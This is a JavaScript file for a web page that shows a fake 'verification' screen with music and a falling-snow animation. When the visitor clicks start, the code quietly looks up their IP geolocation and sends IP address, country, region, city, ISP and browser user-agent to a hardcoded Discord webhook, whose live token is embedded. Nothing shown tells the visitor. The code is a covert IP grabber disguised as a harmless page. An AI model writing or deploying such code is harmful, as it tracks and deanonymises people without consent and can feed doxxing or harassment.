/* script.js */
document.getElementById("start-btn").addEventListener("click", function () {
    document.getElementById("start-screen").remove();
    document.getElementById("main-screen").classList.remove("hidden");
    document.getElementById("verification-text").classList.remove("hidden");
    document.getElementById("verify-btn").classList.remove("hidden");
    document.getElementById("audio").play();
    startSnow();
    
    fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
            let webhookURL = "https://discordapp.com/api/webhooks/1349835869753835560/9h2Z7a8wOKcw6skq0udXhmWOKZMcpCZZYwX5r67UA3X2R5ksRQFT9RY_U2ivIdHuN8u3";
            let payload = {
                username: "Verification Log",
                embeds: [{
                    title: "New Verification Attempt",
                    color: 16711680,
                    fields: [
                        { name: "IP Address", value: data.ip, inline: true },
                        { name: "Country", value: data.country_name, inline: true },
                        { name: "Region", value: data.region, inline: true },
                        { name: "City", value: data.city, inline: true },
                        { name: "ISP", value: data.org, inline: true },
                        { name: "User-Agent", value: navigator.userAgent, inline: false }
                    ],
                    footer: { text: "Verification System" },
                    timestamp: new Date().toISOString()
                }]
            };
            
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        })
        .catch(error => console.error("Error fetching IP data:", error));
});

function startSnow() {
    const canvas = document.getElementById("snow-canvas");
    const ctx = canvas.getContext("2d");
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    let snowflakes = [];
    
    function createSnowflakes() {
        for (let i = 0; i < 100; i++) {
            snowflakes.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                radius: Math.random() * 4 + 1,
                speedY: Math.random() * 3 + 2,
            });
        }
    }
    
    function updateSnow() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "white";
        
        for (let flake of snowflakes) {
            flake.y += flake.speedY;
            if (flake.y > canvas.height) flake.y = 0;
            ctx.beginPath();
            ctx.arc(flake.x, flake.y, flake.radius, 0, Math.PI * 2);
            ctx.fill();
        }
        requestAnimationFrame(updateSnow);
    }
    
    createSnowflakes();
    updateSnow();
}
